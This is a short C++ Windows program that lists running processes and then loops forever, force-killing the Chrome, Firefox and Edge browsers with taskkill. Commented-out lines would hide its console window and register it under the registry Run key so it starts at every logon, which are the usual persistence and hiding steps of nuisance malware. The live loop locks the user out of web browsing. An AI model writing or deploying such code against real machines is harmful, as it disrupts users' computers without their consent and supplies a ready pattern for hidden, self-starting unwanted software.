#include <windows.h>
#include <bits/stdc++.h>
#include <tlhelp32.h>

int main(void)
{
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    // std::wstring progPath = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
    // HKEY hkey = NULL;
    // LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
    // LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));

    // Snapshot of all processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::cout << "Process ID: " << pe32.th32ProcessID << "  ";
            std::wcout << "Process Name: " << pe32.szExeFile << std::endl;
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    while(true)
    {
        std::system("taskkill /f /im chrome.exe");
        std::system("taskkill /f /im firefox.exe");
        std::system("taskkill /f /im msedge.exe");
    }

    // FreeConsole();

    // return 0;
}